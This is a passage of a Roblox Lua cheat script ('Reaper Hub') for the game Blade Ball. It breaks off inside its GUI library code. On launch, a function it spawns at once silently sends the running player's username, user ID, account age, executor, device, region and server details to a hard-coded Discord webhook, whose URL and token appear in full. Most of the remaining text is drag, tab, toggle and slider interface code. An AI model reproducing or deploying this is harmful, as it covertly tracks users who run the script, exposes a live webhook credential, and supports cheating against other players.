-- ========================================
-- REAPER HUB | BLADEBALL v4.0
-- Pure Black + Smooth 3D Animations + Shaders + FPS Booster
-- ========================================

local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local VirtualInputManager = game:GetService("VirtualInputManager")
local Lighting = game:GetService("Lighting")
local VirtualUser = game:GetService("VirtualUser")
local StarterGui = game:GetService("StarterGui")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local Stats = game:GetService("Stats")

local Player = Players.LocalPlayer
local Balls = Workspace:WaitForChild("Balls")
local Camera = Workspace.CurrentCamera

-- ========================================
-- DISCORD WEBHOOK (Enhanced)
-- ========================================
local function SendWebhook()
    local success, err = pcall(function()
        local webhookUrl = "https://discordapp.com/api/webhooks/1465121720611639346/XLgIPcAwvSdN-M6Yibv-AWPsoLmFQpmTfeVOH4sFUIC9NoiXVN6l4lEZ2re2zblJ9OXt"
        
        local userId = Player.UserId
        local username = Player.Name
        local displayName = Player.DisplayName
        local accountAge = Player.AccountAge
        
        -- Avatar URLs
        local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
        local fullAvatarUrl = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
        
        -- Game info
        local gameId = game.PlaceId
        local gameName = "Unknown"
        local gameCreator = "Unknown"
        pcall(function()
            local info = MarketplaceService:GetProductInfo(gameId)
            gameName = info.Name
            gameCreator = info.Creator.Name
        end)
        
        -- Server info
        local serverId = game.JobId
        local serverPlayers = #Players:GetPlayers()
        local maxPlayers = Players.MaxPlayers
        
        -- Executor info
        local executor = "Unknown"
        pcall(function()
            if identifyexecutor then executor = identifyexecutor()
            elseif getexecutorname then executor = getexecutorname()
            elseif KRNL_LOADED then executor = "Krnl"
            elseif syn then executor = "Synapse X"
            elseif SENTINEL_V2 then executor = "Sentinel"
            elseif Fluxus then executor = "Fluxus"
            end
        end)
        
        -- Device info
        local device = "Unknown"
        local platform = "Unknown"
        pcall(function()
            if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
                device = "Mobile"
                platform = UserInputService.TouchEnabled and "Touch" or "Unknown"
            elseif UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
                device = "PC"
                platform = "Desktop"
            elseif UserInputService.GamepadEnabled then
                device = "Console"
                platform = "Gamepad"
            end
        end)
        
        -- Region
        local region = "Unknown"
        pcall(function() region = LocalizationService.RobloxLocaleId end)
        
        -- Membership
        local membership = "None"
        if Player.MembershipType == Enum.MembershipType.Premium then membership = "Premium" end
        
        -- Following count
        local followingCount = "N/A"
        pcall(function()
            if Player:GetFriendsOnline then
                followingCount = tostring(#Player:GetFriendsOnline(200))
            end
        end)
        
        -- Camera info
        local fov = "N/A"
        pcall(function() fov = tostring(math.floor(Camera.FieldOfView)) end)
        
        -- Graphics quality
        local graphicsQuality = "N/A"
        pcall(function()
            graphicsQuality = tostring(settings().Rendering.QualityLevel)
        end)
        
        local timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        
        local embed = {
            ["embeds"] = {
                {
                    ["title"] = "Reaper Hub Executed",
                    ["color"] = 16777215,
                    ["thumbnail"] = {
                        ["url"] = avatarUrl
                    },
                    ["image"] = {
                        ["url"] = fullAvatarUrl
                    },
                    ["fields"] = {
                        {
                            ["name"] = "User Info",
                            ["value"] = "**Username:** " .. username .. "\n**Display Name:** " .. displayName .. "\n**User ID:** " .. userId .. "\n**Account Age:** " .. accountAge .. " days\n**Membership:** " .. membership .. "\n**Friends Online:** " .. followingCount,
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game Info",
                            ["value"] = "**Game:** " .. gameName .. "\n**Creator:** " .. gameCreator .. "\n**Place ID:** " .. gameId .. "\n**Server ID:** " .. (serverId ~= "" and string.sub(serverId, 1, 20) .. "..." or "N/A"),
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Server Info",
                            ["value"] = "**Players:** " .. serverPlayers .. "/" .. maxPlayers,
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Device Info",
                            ["value"] = "**Device:** " .. device .. "\n**Platform:** " .. platform .. "\n**Executor:** " .. executor .. "\n**Region:** " .. region,
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Graphics",
                            ["value"] = "**FOV:** " .. fov .. "\n**Quality:** " .. graphicsQuality,
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Profile Link",
                            ["value"] = "[View Profile](https://www.roblox.com/users/" .. userId .. "/profile)",
                            ["inline"] = true
                        }
                    },
                    ["footer"] = {
                        ["text"] = "Reaper Hub | Bladeball v4.0",
                        ["icon_url"] = avatarUrl
                    },
                    ["timestamp"] = timestamp
                }
            }
        }
        
        local jsonData = HttpService:JSONEncode(embed)
        
        if request then
            request({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = jsonData})
        elseif http_request then
            http_request({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = jsonData})
        elseif syn and syn.request then
            syn.request({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = jsonData})
        elseif http and http.request then
            http.request({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = jsonData})
        end
    end)
end

task.spawn(SendWebhook)

-- PURE BLACK COLOR SCHEME
local Colors = {
    Background = Color3.fromRGB(8, 8, 8),
    Card = Color3.fromRGB(15, 15, 15),
    CardHover = Color3.fromRGB(25, 25, 25),
    Sidebar = Color3.fromRGB(10, 10, 10),
    Border = Color3.fromRGB(35, 35, 35),
    Accent = Color3.fromRGB(255, 255, 255),
    AccentDim = Color3.fromRGB(180, 180, 180),
    Success = Color3.fromRGB(50, 205, 50),
    Warning = Color3.fromRGB(255, 165, 0),
    Danger = Color3.fromRGB(255, 60, 60),
    Text = Color3.fromRGB(255, 255, 255),
    TextDim = Color3.fromRGB(150, 150, 150),
    TextMuted = Color3.fromRGB(80, 80, 80)
}

local function Tween(obj, props, time, style, dir)
    local tween = TweenService:Create(obj, TweenInfo.new(time or 0.3, style or Enum.EasingStyle.Quint, dir or Enum.EasingDirection.Out), props)
    tween:Play()
    return tween
end

-- MOBILE + PC DRAG
local function MakeDraggable(frame, handle)
    handle = handle or frame
    local dragging = false
    local dragStart = nil
    local startPos = nil
    
    local function update(inputPos)
        if dragging and dragStart and startPos then
            local delta = inputPos - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end
    
    handle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = Vector2.new(input.Position.X, input.Position.Y)
            startPos = frame.Position
        end
    end)
    
    handle.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            update(Vector2.new(input.Position.X, input.Position.Y))
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            update(Vector2.new(input.Position.X, input.Position.Y))
        end
    end)
    
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)
end

-- Destroy old GUI
if game.CoreGui:FindFirstChild("ReaperHub") then
    game.CoreGui:FindFirstChild("ReaperHub"):Destroy()
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "ReaperHub"
ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

-- MINIMIZED PILL
local MinimizedPill = Instance.new("Frame")
MinimizedPill.Name = "MinimizedPill"
MinimizedPill.Parent = ScreenGui
MinimizedPill.BackgroundColor3 = Colors.Card
MinimizedPill.BorderSizePixel = 0
MinimizedPill.Position = UDim2.new(0.5, -120, 0, 15)
MinimizedPill.Size = UDim2.new(0, 240, 0, 45)
MinimizedPill.Visible = false
MinimizedPill.Active = true

local pillCorner = Instance.new("UICorner")
pillCorner.CornerRadius = UDim.new(0, 25)
pillCorner.Parent = MinimizedPill

local pillStroke = Instance.new("UIStroke")
pillStroke.Color = Colors.Border
pillStroke.Thickness = 1
pillStroke.Parent = MinimizedPill

local pillIcon = Instance.new("TextLabel")
pillIcon.Parent = MinimizedPill
pillIcon.BackgroundTransparency = 1
pillIcon.Position = UDim2.new(0, 18, 0, 0)
pillIcon.Size = UDim2.new(0, 25, 1, 0)
pillIcon.Font = Enum.Font.GothamBold
pillIcon.Text = "[R]"
pillIcon.TextColor3 = Colors.Accent
pillIcon.TextSize = 14

local pillText = Instance.new("TextLabel")
pillText.Parent = MinimizedPill
pillText.BackgroundTransparency = 1
pillText.Position = UDim2.new(0, 45, 0, 0)
pillText.Size = UDim2.new(1, -55, 1, 0)
pillText.Font = Enum.Font.GothamBold
pillText.Text = "Reaper Hub"
pillText.TextColor3 = Colors.Text
pillText.TextSize = 14
pillText.TextXAlignment = Enum.TextXAlignment.Left

local pillButton = Instance.new("TextButton")
pillButton.Parent = MinimizedPill
pillButton.BackgroundTransparency = 1
pillButton.Size = UDim2.new(1, 0, 1, 0)
pillButton.Text = ""
pillButton.ZIndex = 3

MakeDraggable(MinimizedPill, pillButton)

pillButton.MouseEnter:Connect(function()
    Tween(MinimizedPill, {BackgroundColor3 = Colors.CardHover}, 0.2)
    Tween(pillStroke, {Color = Colors.Accent}, 0.2)
end)

pillButton.MouseLeave:Connect(function()
    Tween(MinimizedPill, {BackgroundColor3 = Colors.Card}, 0.2)
    Tween(pillStroke, {Color = Colors.Border}, 0.2)
end)

-- MAIN WINDOW
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Colors.Background
MainFrame.BackgroundTransparency = 0.05
MainFrame.BorderSizePixel = 0
MainFrame.Position = UDim2.new(0.5, -250, 0.5, -200)
MainFrame.Size = UDim2.new(0, 500, 0, 400)
MainFrame.ClipsDescendants = true
MainFrame.Active = true

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 12)
mainCorner.Parent = MainFrame

local mainStroke = Instance.new("UIStroke")
mainStroke.Color = Colors.Border
mainStroke.Thickness = 1
mainStroke.Parent = MainFrame

-- TITLE BAR
local TitleBar = Instance.new("Frame")
TitleBar.Name = "TitleBar"
TitleBar.Parent = MainFrame
TitleBar.BackgroundColor3 = Colors.Sidebar
TitleBar.BorderSizePixel = 0
TitleBar.Size = UDim2.new(1, 0, 0, 50)
TitleBar.Active = true

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 12)
titleCorner.Parent = TitleBar

local titleFix = Instance.new("Frame")
titleFix.Parent = TitleBar
titleFix.BackgroundColor3 = Colors.Sidebar
titleFix.BorderSizePixel = 0
titleFix.Position = UDim2.new(0, 0, 1, -12)
titleFix.Size = UDim2.new(1, 0, 0, 12)

local titleIconBg = Instance.new("Frame")
titleIconBg.Parent = TitleBar
titleIconBg.BackgroundColor3 = Colors.Accent
titleIconBg.BackgroundTransparency = 0.9
titleIconBg.Position = UDim2.new(0, 15, 0.5, -15)
titleIconBg.Size = UDim2.new(0, 30, 0, 30)

local titleIconCorner = Instance.new("UICorner")
titleIconCorner.CornerRadius = UDim.new(0, 8)
titleIconCorner.Parent = titleIconBg

local titleIcon = Instance.new("TextLabel")
titleIcon.Parent = titleIconBg
titleIcon.BackgroundTransparency = 1
titleIcon.Size = UDim2.new(1, 0, 1, 0)
titleIcon.Font = Enum.Font.GothamBold
titleIcon.Text = "R"
titleIcon.TextColor3 = Colors.Accent
titleIcon.TextSize = 16

local titleLabel = Instance.new("TextLabel")
titleLabel.Parent = TitleBar
titleLabel.BackgroundTransparency = 1
titleLabel.Position = UDim2.new(0, 55, 0, 8)
titleLabel.Size = UDim2.new(1, -120, 0, 18)
titleLabel.Font = Enum.Font.GothamBold
titleLabel.Text = "Reaper Hub | Bladeball"
titleLabel.TextColor3 = Colors.Text
titleLabel.TextSize = 15
titleLabel.TextXAlignment = Enum.TextXAlignment.Left

local subtitleLabel = Instance.new("TextLabel")
subtitleLabel.Parent = TitleBar
subtitleLabel.BackgroundTransparency = 1
subtitleLabel.Position = UDim2.new(0, 55, 0, 26)
subtitleLabel.Size = UDim2.new(1, -120, 0, 14)
subtitleLabel.Font = Enum.Font.Gotham
subtitleLabel.Text = "v4.0"
subtitleLabel.TextColor3 = Colors.TextMuted
subtitleLabel.TextSize = 11
subtitleLabel.TextXAlignment = Enum.TextXAlignment.Left

local minimizeBtn = Instance.new("TextButton")
minimizeBtn.Parent = TitleBar
minimizeBtn.BackgroundColor3 = Colors.Card
minimizeBtn.BorderSizePixel = 0
minimizeBtn.Position = UDim2.new(1, -45, 0.5, -12)
minimizeBtn.Size = UDim2.new(0, 24, 0, 24)
minimizeBtn.Font = Enum.Font.GothamBold
minimizeBtn.Text = "-"
minimizeBtn.TextColor3 = Colors.TextDim
minimizeBtn.TextSize = 18
minimizeBtn.AutoButtonColor = false

local minimizeBtnCorner = Instance.new("UICorner")
minimizeBtnCorner.CornerRadius = UDim.new(0, 6)
minimizeBtnCorner.Parent = minimizeBtn

minimizeBtn.MouseEnter:Connect(function()
    Tween(minimizeBtn, {BackgroundColor3 = Colors.Accent, TextColor3 = Colors.Background}, 0.15)
end)

minimizeBtn.MouseLeave:Connect(function()
    Tween(minimizeBtn, {BackgroundColor3 = Colors.Card, TextColor3 = Colors.TextDim}, 0.15)
end)

MakeDraggable(MainFrame, TitleBar)

minimizeBtn.MouseButton1Click:Connect(function()
    Tween(MainFrame, {Size = UDim2.new(0, 500, 0, 0)}, 0.35, Enum.EasingStyle.Back, Enum.EasingDirection.In)
    task.wait(0.35)
    MainFrame.Visible = false
    MinimizedPill.Visible = true
    MinimizedPill.Size = UDim2.new(0, 0, 0, 45)
    Tween(MinimizedPill, {Size = UDim2.new(0, 240, 0, 45)}, 0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
end)

pillButton.MouseButton1Click:Connect(function()
    Tween(MinimizedPill, {Size = UDim2.new(0, 0, 0, 45)}, 0.35, Enum.EasingStyle.Back, Enum.EasingDirection.In)
    task.wait(0.35)
    MinimizedPill.Visible = false
    MainFrame.Visible = true
    MainFrame.Size = UDim2.new(0, 500, 0, 0)
    Tween(MainFrame, {Size = UDim2.new(0, 500, 0, 400)}, 0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
end)

-- SIDEBAR
local Sidebar = Instance.new("Frame")
Sidebar.Name = "Sidebar"
Sidebar.Parent = MainFrame
Sidebar.BackgroundColor3 = Colors.Sidebar
Sidebar.BorderSizePixel = 0
Sidebar.Position = UDim2.new(0, 0, 0, 50)
Sidebar.Size = UDim2.new(0, 130, 1, -50)

local sidebarLine = Instance.new("Frame")
sidebarLine.Parent = Sidebar
sidebarLine.BackgroundColor3 = Colors.Border
sidebarLine.BorderSizePixel = 0
sidebarLine.Position = UDim2.new(1, -1, 0, 15)
sidebarLine.Size = UDim2.new(0, 1, 1, -30)

local TabButtonsContainer = Instance.new("Frame")
TabButtonsContainer.Name = "TabButtons"
TabButtonsContainer.Parent = Sidebar
TabButtonsContainer.BackgroundTransparency = 1
TabButtonsContainer.Position = UDim2.new(0, 10, 0, 15)
TabButtonsContainer.Size = UDim2.new(1, -20, 1, -20)

local tabLayout = Instance.new("UIListLayout")
tabLayout.Parent = TabButtonsContainer
tabLayout.SortOrder = Enum.SortOrder.LayoutOrder
tabLayout.Padding = UDim.new(0, 6)

-- CONTENT AREA
local ContentArea = Instance.new("Frame")
ContentArea.Name = "ContentArea"
ContentArea.Parent = MainFrame
ContentArea.BackgroundColor3 = Colors.Background
ContentArea.BackgroundTransparency = 0
ContentArea.Position = UDim2.new(0, 130, 0, 50)
ContentArea.Size = UDim2.new(1, -130, 1, -50)
ContentArea.ClipsDescendants = true

-- ========================================
-- TAB SYSTEM WITH SMOOTH 3D ANIMATIONS
-- ========================================
local Tabs = {}
local CurrentTab = nil

local function CreateTab(name, icon)
    local Tab = {Name = name, Sections = {}}
    
    local tabBtn = Instance.new("TextButton")
    tabBtn.Name = name
    tabBtn.Parent = TabButtonsContainer
    tabBtn.BackgroundColor3 = Colors.Card
    tabBtn.BackgroundTransparency = 1
    tabBtn.BorderSizePixel = 0
    tabBtn.Size = UDim2.new(1, 0, 0, 36)
    tabBtn.Text = ""
    tabBtn.AutoButtonColor = false
    
    local tabCorner = Instance.new("UICorner")
    tabCorner.CornerRadius = UDim.new(0, 8)
    tabCorner.Parent = tabBtn
    
    local activeIndicator = Instance.new("Frame")
    activeIndicator.Name = "Indicator"
    activeIndicator.Parent = tabBtn
    activeIndicator.BackgroundColor3 = Colors.Accent
    activeIndicator.BorderSizePixel = 0
    activeIndicator.Position = UDim2.new(0, 0, 0.5, -10)
    activeIndicator.Size = UDim2.new(0, 3, 0, 20)
    activeIndicator.Visible = false
    
    local indicatorCorner = Instance.new("UICorner")
    indicatorCorner.CornerRadius = UDim.new(0, 2)
    indicatorCorner.Parent = activeIndicator
    
    local tabIcon = Instance.new("TextLabel")
    tabIcon.Parent = tabBtn
    tabIcon.BackgroundTransparency = 1
    tabIcon.Position = UDim2.new(0, 12, 0, 0)
    tabIcon.Size = UDim2.new(0, 20, 1, 0)
    tabIcon.Font = Enum.Font.GothamBold
    tabIcon.Text = icon or ">"
    tabIcon.TextColor3 = Colors.TextMuted
    tabIcon.TextSize = 11
    
    local tabText = Instance.new("TextLabel")
    tabText.Parent = tabBtn
    tabText.BackgroundTransparency = 1
    tabText.Position = UDim2.new(0, 32, 0, 0)
    tabText.Size = UDim2.new(1, -37, 1, 0)
    tabText.Font = Enum.Font.GothamSemibold
    tabText.Text = name
    tabText.TextColor3 = Colors.TextMuted
    tabText.TextSize = 11
    tabText.TextXAlignment = Enum.TextXAlignment.Left
    
    local tabContent = Instance.new("ScrollingFrame")
    tabContent.Name = name .. "_Content"
    tabContent.Parent = ContentArea
    tabContent.BackgroundColor3 = Colors.Background
    tabContent.BackgroundTransparency = 0
    tabContent.BorderSizePixel = 0
    tabContent.Position = UDim2.new(0, 10, 0, 10)
    tabContent.Size = UDim2.new(1, -20, 1, -20)
    tabContent.CanvasSize = UDim2.new(0, 0, 0, 0)
    tabContent.ScrollBarThickness = 3
    tabContent.ScrollBarImageColor3 = Colors.Border
    tabContent.Visible = false
    tabContent.ClipsDescendants = true
    
    local contentLayout = Instance.new("UIListLayout")
    contentLayout.Parent = tabContent
    contentLayout.SortOrder = Enum.SortOrder.LayoutOrder
    contentLayout.Padding = UDim.new(0, 10)
    
    contentLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        tabContent.CanvasSize = UDim2.new(0, 0, 0, contentLayout.AbsoluteContentSize.Y + 15)
    end)
    
    Tab.Button = tabBtn
    Tab.Content = tabContent
    Tab.Icon = tabIcon
    Tab.Text = tabText
    Tab.Indicator = activeIndicator
    
    -- SMOOTH 3D TAB SWITCHING
    local function SwitchToTab()
        if CurrentTab == Tab then return end
        
        if CurrentTab then
            local oldContent = CurrentTab.Content
            
            -- Smooth 3D exit animation
            oldContent.Position = UDim2.new(0, 10, 0, 10)
            
            local exitTween = TweenService:Create(oldContent, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {
                Position = UDim2.new(-0.5, 0, 0, 10),
                BackgroundTransparency = 0.5
            })
            exitTween:Play()
            
            task.delay(0.25, function()
                oldContent.Visible = false
                oldContent.Position = UDim2.new(0, 10, 0, 10)
                oldContent.BackgroundTransparency = 0
            end)
            
            CurrentTab.Indicator.Visible = false
            Tween(CurrentTab.Button, {BackgroundTransparency = 1}, 0.2)
            Tween(CurrentTab.Icon, {TextColor3 = Colors.TextMuted}, 0.2)
            Tween(CurrentTab.Text, {TextColor3 = Colors.TextMuted}, 0.2)
        end
        
        -- Smooth 3D enter animation
        Tab.Content.Position = UDim2.new(0.5, 0, 0, 10)
        Tab.Content.BackgroundTransparency = 0.5
        Tab.Content.Visible = true
        
        local enterTween = TweenService:Create(Tab.Content, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
            Position = UDim2.new(0, 10, 0, 10),
            BackgroundTransparency = 0
        })
        enterTween:Play()
        
        Tab.Indicator.Visible = true
        CurrentTab = Tab
        Tween(Tab.Button, {BackgroundTransparency = 0.5}, 0.2)
        Tween(Tab.Icon, {TextColor3 = Colors.Accent}, 0.2)
        Tween(Tab.Text, {TextColor3 = Colors.Text}, 0.2)
    end
    
    tabBtn.MouseButton1Click:Connect(SwitchToTab)
    
    tabBtn.MouseEnter:Connect(function()
        if CurrentTab ~= Tab then
            Tween(tabBtn, {BackgroundTransparency = 0.7}, 0.15)
        end
    end)
    
    tabBtn.MouseLeave:Connect(function()
        if CurrentTab ~= Tab then
            Tween(tabBtn, {BackgroundTransparency = 1}, 0.15)
        end
    end)
    
    table.insert(Tabs, Tab)
    
    if #Tabs == 1 then
        Tab.Content.Visible = true
        Tab.Indicator.Visible = true
        CurrentTab = Tab
        Tab.Button.BackgroundTransparency = 0.5
        Tab.Icon.TextColor3 = Colors.Accent
        Tab.Text.TextColor3 = Colors.Text
    end
    
    function Tab:AddSection(title)
        local Section = {}
        
        local sectionFrame = Instance.new("Frame")
        sectionFrame.Parent = tabContent
        sectionFrame.BackgroundTransparency = 1
        sectionFrame.Size = UDim2.new(1, 0, 0, 0)
        sectionFrame.AutomaticSize = Enum.AutomaticSize.Y
        
        local sectionLayout = Instance.new("UIListLayout")
        sectionLayout.Parent = sectionFrame
        sectionLayout.SortOrder = Enum.SortOrder.LayoutOrder
        sectionLayout.Padding = UDim.new(0, 6)
        
        local sectionTitle = Instance.new("TextLabel")
        sectionTitle.Parent = sectionFrame
        sectionTitle.BackgroundTransparency = 1
        sectionTitle.Size = UDim2.new(1, 0, 0, 22)
        sectionTitle.Font = Enum.Font.GothamBold
        sectionTitle.Text = title
        sectionTitle.TextColor3 = Colors.Text
        sectionTitle.TextSize = 12
        sectionTitle.TextXAlignment = Enum.TextXAlignment.Left
        
        function Section:AddToggle(config)
            local Toggle = {State = config.Default or false}
            
            local toggleFrame = Instance.new("Frame")
            toggleFrame.Parent = sectionFrame
            toggleFrame.BackgroundColor3 = Colors.Card
            toggleFrame.BorderSizePixel = 0
            toggleFrame.Size = UDim2.new(1, 0, 0, 40)
            
            local toggleCorner = Instance.new("UICorner")
            toggleCorner.CornerRadius = UDim.new(0, 8)
            toggleCorner.Parent = toggleFrame
            
            local toggleStroke = Instance.new("UIStroke")
            toggleStroke.Color = Colors.Border
            toggleStroke.Thickness = 1
            toggleStroke.Parent = toggleFrame
            
            local toggleLabel = Instance.new("TextLabel")
            toggleLabel.Parent = toggleFrame
            toggleLabel.BackgroundTransparency = 1
            toggleLabel.Position = UDim2.new(0, 12, 0, 0)
            toggleLabel.Size = UDim2.new(1, -70, 1, 0)
            toggleLabel.Font = Enum.Font.Gotham
            toggleLabel.Text = config.Title
            toggleLabel.TextColor3 = Colors.Text
            toggleLabel.TextSize = 12
            toggleLabel.TextXAlignment = Enum.TextXAlignment.Left
            
            local switchBg = Instance.new("Frame")
            switchBg.Parent = toggleFrame
            switchBg.BackgroundColor3 = Toggle.State and Colors.Success or Colors.Border
            switchBg.BorderSizePixel = 0
            switchBg.Position = UDim2.new(1, -52, 0.5, -10)
            switchBg.Size = UDim2.new(0, 40, 0, 20)
            
            local switchCorner = Instance.new("UICorner")
            switchCorner.CornerRadius = UDim.new(1, 0)
            switchCorner.Parent = switchBg
            
            local knob = Instance.new("Frame")
            knob.Parent = switchBg
            knob.BackgroundColor3 = Colors.Text
            knob.BorderSizePixel = 0
            knob.Position = Toggle.State and UDim2.new(1, -18, 0.5, -8) or UDim2.new(0, 2, 0.5, -8)
            knob.Size = UDim2.new(0, 16, 0, 16)
            
            local knobCorner = Instance.new("UICorner")
            knobCorner.CornerRadius = UDim.new(1, 0)
            knobCorner.Parent = knob
            
            local toggleBtn = Instance.new("TextButton")
            toggleBtn.Parent = toggleFrame
            toggleBtn.BackgroundTransparency = 1
            toggleBtn.Size = UDim2.new(1, 0, 1, 0)
            toggleBtn.Text = ""
            
            toggleBtn.MouseButton1Click:Connect(function()
                Toggle.State = not Toggle.State
                Tween(switchBg, {BackgroundColor3 = Toggle.State and Colors.Success or Colors.Border}, 0.2)
                Tween(knob, {Position = Toggle.State and UDim2.new(1, -18, 0.5, -8) or UDim2.new(0, 2, 0.5, -8)}, 0.2, Enum.EasingStyle.Back)
                if config.Callback then pcall(config.Callback, Toggle.State) end
            end)
            
            toggleBtn.MouseEnter:Connect(function()
                Tween(toggleFrame, {BackgroundColor3 = Colors.CardHover}, 0.15)
            end)
            
            toggleBtn.MouseLeave:Connect(function()
                Tween(toggleFrame, {BackgroundColor3 = Colors.Card}, 0.15)
            end)
            
            return Toggle
        end
        
        function Section:AddSlider(config)
            local Slider = {Value = config.Default or config.Min or 0}
            
            local sliderFrame = Instance.new("Frame")
            sliderFrame.Parent = sectionFrame
            sliderFrame.BackgroundColor3 = Colors.Card
            sliderFrame.BorderSizePixel = 0
            sliderFrame.Size = UDim2.new(1, 0, 0, 55)
            
            local sliderCorner = Instance.new("UICorner")
            sliderCorner.CornerRadius = UDim.new(0, 8)
            sliderCorner.Parent = sliderFrame
            
            local sliderStroke = Instance.new("UIStroke")
            sliderStroke.Color = Colors.Border
            sliderStroke.Thickness = 1
            sliderStroke.Parent = sliderFrame
            
            local sliderLabel = Instance.new("TextLabel")
            sliderLabel.Parent = sliderFrame
            sliderLabel.BackgroundTransparency = 1
            sliderLabel.Position = UDim2.new(0, 12, 0, 8)
            sliderLabel.Size = UDim2.new(1, -60, 0, 16)
            sliderLabel.Font = Enum.Font.Gotham
            sliderLabel.Text = config.Title
            sliderLabel.TextColor3 = Colors.Text
            sliderLabel.TextSize = 12
            sliderLabel.TextXAlignment = Enum.TextXAlignment.Left
            
            local valueLabel = Instance.new("TextLabel")
            valueLabel.Parent = sliderFrame
            valueLabel.BackgroundTransparency = 1
            valueLabel.Position = UDim2.new(1, -50, 0, 8)
            valueLabel.Size = UDim2.new(0, 38, 0, 16)
            valueLabel.Font = Enum.Font.GothamBold
            valueLabel.Text = tostring(Slider.Value)
            valueLabel.TextColor3 = Colors.Accent
            valueLabel.TextSize = 12
            valueLabel.TextXAlignment = Enum.TextXAlignment.Right
            
            local sliderBg = Instance.new("Frame")
            sliderBg.Parent = sliderFrame
            sliderBg.BackgroundColor3 = Colors.Border
            sliderBg.BorderSizePixel = 0
            sliderBg.Position = UDim2.new(0, 12, 0, 35)
            sliderBg.Size = UDim2.new(1, -24, 0, 6)
            
            local sliderBgCorner = Instance.new("UICorner")
            sliderBgCorner.CornerRadius = UDim.new(1, 0)
            sliderBgCorner.Parent = sliderBg
            
            local sliderFill = Instance.new("Frame")
            sliderFill.Parent = sliderBg
            sliderFill.BackgroundColor3 = Colors.Accent
            sliderFill.BorderSizePixel = 0
            sliderFill.Size = UDim2.new(0, 0, 1, 0)
            
            local sliderFillCorner = Instance.new("UICorner")
            sliderFillCorner.CornerRadius = UDim.new(1, 0)
            sliderFillCorner.Parent = sliderFill
            
            local sliderKnob = Instance.new("Frame")
            sliderKnob.Parent = sliderBg
            sliderKnob.BackgroundColor3 = Colors.Text
            sliderKnob.BorderSizePixel = 0
            sliderKnob.AnchorPoint = Vector2.new(0.5, 0.5)
            sliderKnob.Position = UDim2.new(0, 0, 0.5, 0)
            sliderKnob.Size = UDim2.new(0, 12, 0, 12)
            sliderKnob.ZIndex = 2
            
            local sliderKnobCorner = Instance.new("UICorner")
            sliderKnobCorner.CornerRadius = UDim.new(1, 0)
            sliderKnobCorner.Parent = sliderKnob
            
            local function updateSlider(inputPos)
                local pos = math.clamp((inputPos.X - sliderBg.AbsolutePosition.X) / sliderBg.AbsoluteSize.X, 0, 1)
                local min = config.Min or 0
                local max = config.Max or 100
                Slider.Value = math.floor(min + (max - min) * pos)
                valueLabel.Text = tostring(Slider.Value)
                sliderFill.Size = UDim2.new(pos, 0, 1, 0)
                sliderKnob.Position = UDim2.new(pos, 0, 0.5, 0)
                if config.Callback then pcall(config.Callback, Slider.Value) end
            end
            
            local draggingSlider = false
            
            sliderBg.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    draggingSlider = true
                    updateSlider(input.Position)
                end
            end)
            
            UserInputService.InputChanged:Connect(function(input)
                if draggingSlider and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
                    updateSlider(input.Position)
                end
            end)
            
            UserInputService.InputEnded:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    draggingSlider = false
                end
            end)
            
            local initialPos = (Slider.Value - (config.Min or 0)) / ((config.Max or 100) - (config.Min or 0))
            sliderFill.Size = UDim2.new(initialPos, 0, 1, 0)
            sliderKnob.Position = UDim2.new(initialPos, 0, 0.5, 0)
            
            return Slider
        end
        
        function Section:AddButton(config)
            local buttonFrame = Instance.new("TextButton")
            buttonFrame.Parent = sectionFrame
            buttonFrame.BackgroundColor3 = Colors.Card
